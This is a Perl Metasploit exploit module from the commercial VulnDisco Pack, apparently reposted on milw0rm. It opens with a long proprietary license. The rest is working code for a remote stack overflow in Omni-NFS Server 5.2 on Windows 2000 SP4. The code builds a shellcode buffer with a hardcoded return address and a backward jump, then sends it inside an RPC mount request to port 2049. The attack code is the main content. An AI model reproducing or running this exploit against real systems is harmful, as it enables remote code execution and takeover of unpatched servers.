# vd_xlink.pm
#
# The exploit is a part of VulnDisco Pack - use only under the license agreement
# specified in LICENSE.txt in your VulnDisco distribution

# VULNDISCO LICENSE

# Purchaser buys VulnDisco Pack ("the Pack") and receives the right to use it under the terms of the following License.

# The Pack with all the data and software contained in it is the private property of GLEG ltd. Company ("the Company"). The Company is the only entity who has exclusive rights to the Pack. The Pack with all the software and data containing in it is the intellectual property of the Company and is guarded by intellectual property laws.

# Purchaser has the rights to use the Pack only under the terms and conditions of this License to the maximum extent permitted by applicable law.
# Purchaser has the rights to use the Pack only for his own needs or for the needs of his company if the License is purchased by the company. For the means of this License by purchaser's company those people are meant who directly works for the company which owns the License.
# Purchaser is granted nonexclusive, non-transferable rights to use the Pack.

# Purchaser is allowed to install the Pack on unlimited number of seats.

# Purchaser is not restricted to use the Pack to test the particular IP range.

# Purchaser is not allowed to disclose the Pack in whole or partly, to disclose any information concerning the Pack or any information derived from the Pack. Purchaser is not allowed to transfer the Pack or any data concerning it (including derived data), anyhow or by any means to third party entities. Purchaser is not allowed to sell or redistribute or otherwise transfer the rights to the Pack unless otherwise is expressly stated in writing by the Company.

# Purchaser realizes that the Pack is provided as-is without warranty of any kind, including warranties that the Pack suits particular needs, is safe to use, or contain no issues. 

# Purchaser realizes that the Pack contains potentially dangerous information which being improper used or misused can cause damage to Purchaser or to Purchaser's company or to third party organizations and individuals. 

# The Company is not responsible for any losses to purchaser or to purchaser's company resulted from Purchaser's proper or improper use or inability to use the Pack, including but not limited to loss of information, damages to computers or to network infrastructure. The Company is not responsible for any losses to any third party organizations or individuals resulted from Purchaser's intentional or accidental use or misuse of the Pack. The Company is not responsible for any consequences of Purchaser's disclosure of the Pack. 

# Purchaser realizes that he is solely responsible for any claims resulted from Purchaser's acquisition, use or misuse of the Pack and agrees to defend Company from mentioned claims at own cost. 

# Purchaser agrees to take all necessary measures to not allow disclosure of the Pack, to use it only under the terms of this License and applicable law. Purchaser has been informed and agrees that in case of Purchaser.s breach of any provisions of this License the Company has right to take appropriate measures including legal prosecution.

# All information that is provided for Purchaser by the Company, including Pack updates and support information, is provided under the same terms as in the Pack License. As for newer versions of the Pack, the Company reserves the right to issue new License with them.

# This License is designed in accordance with the laws of Russian Federation.
# License terms are governed by the laws of Russian Federation. Unless otherwise is agreed in writing, all disputes relating to this License shall be subject to final and binding arbitration in Russia, Moscow.

# Purchaser has been informed and agrees that after installation of the Pack this Agreement is considered as signed and came into force as Agreement between the Company and Purchaser.

# Purchaser has read and understood this License, and agrees to its terms and conditions.

use strict;

package Msf::Exploit::vd_xlink;
use base "Msf::Exploit";
use Pex::Text;

my $advanced = { };

my $info = 
{
	"Name"      => "[0day] Omni-NFS Server overflow",
    	"Version"   => "\$Revision: 1.0 \$",
    	"Authors"   => ["Evgeny Legerov"],
    	"Arch"      => ["x86"],
    	"OS"        => ["win32"],
    	"Priv"      => 1,
    	"UserOpts"  =>
                {
                	"RHOST" => [1, "ADDR", "The target address"],
                    	"RPORT" => [1, "PORT", "The target port", 2049],
                },

    	"Description" => Pex::Text::Freeform(q{
			Exploit for Omni-NFS Server stack overflow vulnerability.
		}),


   	"Payload" =>
        	{
                "Space"     => 427,
          	},

        "DefaultTarget"  => 0,
        "Targets"        =>
         	[
        		["Omni-NFS Server 5.2 (nfsd.exe: call ebx) / Windows 2000 SP4", 0x00401843]

         	],

        "Keys"           => ["vd_xlink"],
};

sub new	{
	my $class = shift;
	return $class->SUPER::new({"Info" => $info, "Advanced" => $advanced}, @_);
}

sub Exploit {
	my $self = shift;
        my $host = $self->GetVar("RHOST");
        my $port = $self->GetVar("RPORT");
	my $writedir = $self->GetVar("DIR");
	my $bind_port = $self->GetVar("LPORT");
	my $target = $self->Targets->[$self->GetVar("TARGET")];
	my $encodedPayload = $self->GetVar("EncodedPayload");
        my $shellcode   = $encodedPayload->Payload;

     	my $payload = "";
        $payload .= "\x4d" x 9;
        $payload .= $shellcode;
        $payload .= "\x4d" x (427 - length($shellcode));
        $payload .= "\x4d\x4d\x4d\x2d";
        $payload .= pack("V", $target->[1]);
        $payload .= "\xe9\x17\xfb\xff\xff"; # jmp $-1257
        $payload .= "\x45" x 351;

        my $s = "";
        $s .= pack("N", 1);
        $s .= pack("N", 0);
        $s .= pack("N", 2);
        $s .= pack("N", 100005);
        $s .= pack("N", 1);
        $s .= pack("N", 1);

        $s .= pack("N", 1);
        $s .= pack("N", 400);
        $s .= substr($payload, 0, 400);

        $s .= pack("N", 1);
        $s .= pack("N", 400);
        $s .= substr($payload, 400);

                
	my $req = pack("N", length($s) | 0x80000000) . $s;

  	my $sock = Msf::Socket::Tcp->new("PeerAddr" => $host, "PeerPort"  => $port);
        if ($sock->IsError) {
                $self->PrintLine("Error creating socket: " . $sock->GetError);
                return;
        }

	$sock->Send($req);
	
	sleep(3);

	$sock->Close();
}

__END__

# milw0rm.com [2006-11-06]